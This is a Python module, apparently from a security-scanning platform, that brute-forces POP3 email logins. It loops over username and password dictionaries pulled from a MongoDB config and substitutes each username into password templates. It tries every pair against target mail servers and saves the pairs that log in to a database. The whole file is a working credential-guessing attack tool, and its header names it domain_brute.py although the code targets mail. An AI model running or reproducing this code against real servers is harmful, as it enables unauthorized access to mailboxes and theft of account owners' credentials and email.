#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author  : yds
# @Time    : 18-5-19
# @File    : domain_brute.py
# @Desc    : ""
import poplib

import requests
from lxml import etree
import csv
from tqdm import tqdm
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.header import Header
from email.utils import parseaddr,formataddr
from email import encoders
from time import sleep
import os
import sys
import dns.resolver
from multiprocessing import Pool, Lock
from datetime import datetime
from random import sample
from string import digits, ascii_lowercase
from yandi.views.lib.mongo_db import connectiondb, db_name_conf
from yandi.views.lib.get_title import get_title
from instance import config_name

lock = Lock()
email_db = db_name_conf()['mail_task_db']
subemail_db = db_name_conf()['mail_db']
config_db = db_name_conf()['config_db']

class emailBrute:

    def __init__(self, email_name_val,email_name_val1, email_id):
        print("[*] %s %s Brute Start" % (datetime.now().strftime("%Y-%m-%d %H:%M:%S"), email_id))
        self.email = email_name_val1
        self.keyword=email_name_val
        self.email_id = email_id
        self.mail_user=[]
        self.mail_password=[]
        self.third_domain = connectiondb(email_db).find_one({"_id": email_id})['third_domain']
        self.mail_user_dict = connectiondb(config_db).find_one({"config_name": config_name})['mail_user_dict']
        self.mail_password_dict = connectiondb(config_db).find_one({"config_name": config_name})['mail_password_dict']
        self.resolver_ip = ''
        self.result = ''
    def mail_handle(self):
        for mailuser in self.mail_user_dict:
            self.mail_user.append(mailuser.strip())
        for mailpassword in self.mail_password_dict:
            self.mail_password.append(mailpassword.strip())
        return True

    def multi_brute(self):
        self.mail_handle()
        data_save = []
        try:
            for user in self.mail_user:
                message1 = message2 = ''
                for pwd in self.mail_password:
                    pwd = pwd.replace('<user>', user)
                    while True:
                        try:
                            email = str(user)
                            password = str(pwd)
                            pop3_server = self.email
                            # 连接到POP3服务器:
                            server = poplib.POP3(pop3_server,int(connectiondb(config_db).find_one({"config_name": config_name})['mail_port']))
                            server.user(email)
                            server.pass_(password)
                            # stat()返回邮件数量和占用空间:
                            message1, message2 = server.stat()
                            server.quit()
                            break
                        except:
                            break
                    if len(str(message1)) > 0:
                        message1 = ''
                        #print('(SUCESS)>> User:', user, 'Password:', pwd)
                        data = {
                            "subemail": self.keyword,
                            "email": self.email,
                            "email_id": self.email_id,
                            "date": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                            "result": user+"||"+pwd,
                            "user":pwd,
                            "title": '',
                        }
                        data_save.append(data)
                try:
                    if data_save:
                        connectiondb(subemail_db).insert_many(data_save, ordered=True)
                except Exception as e:
                    print(e)
                data_save=[]
        except Exception as e:
            print(e)

def start_email_brute(email_name_val,payloads_list, email_id):
    time_start = datetime.now()
    print("[*] %s mail Brute start %s" % (time_start.strftime("%Y-%m-%d %H:%M:%S"), email_id))
    connectiondb(email_db).update_one({"_id": email_id}, {"$set": {
        "status": "Running"
    }})

    for email_name_val1 in payloads_list:
        start_brute = emailBrute(email_name_val,email_name_val1,email_id)
        start_brute.multi_brute()
    connectiondb(email_db).update_one({"_id": email_id}, {"$set": {
        "status": "Done"
    }})

    time_end = datetime.now()
    print("[*] %s mail Brute Done %s" % (time_end.strftime("%Y-%m-%d %H:%M:%S"), email_id))
    print("[*] %s Used Time: %s" % (time_end.strftime("%Y-%m-%d %H:%M:%S"), (time_end - time_start).seconds))